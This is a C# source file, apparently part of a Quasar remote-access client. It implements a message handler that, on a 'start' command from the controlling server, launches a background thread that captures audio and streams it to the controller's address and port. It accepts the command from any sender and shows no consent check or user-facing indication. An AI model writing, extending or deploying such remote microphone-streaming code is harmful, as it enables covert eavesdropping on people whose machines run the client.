using Quasar.Client.Interception;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Client.Networking;
using Quasar.Client.Audio;

using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class AudioTransferHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoAudioTransfer;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoAudioTransfer msg:
                    Execute(sender, msg);
                    break;
                default:
                    break;
            }
        }

        private void Execute(ISender client, DoAudioTransfer message)
        {
            Networking.Client clientRef = (Networking.Client)client;
            new Thread(() =>
            {
                if (clientRef.audioSender != null)
                {
                    clientRef.audioSender.Stop();
                    clientRef.audioSender = null;
                }
                if (message.Action == "start")
                {
                    clientRef.audioSender = new AudioSender(clientRef.IpAddress, message.Port, message.SampleRate, message.BitDepth, message.Channels);
                    clientRef.audioSender.Start();
                }
                Thread.Sleep(100);
            })
            { IsBackground = true }.Start();
        }
    }

}
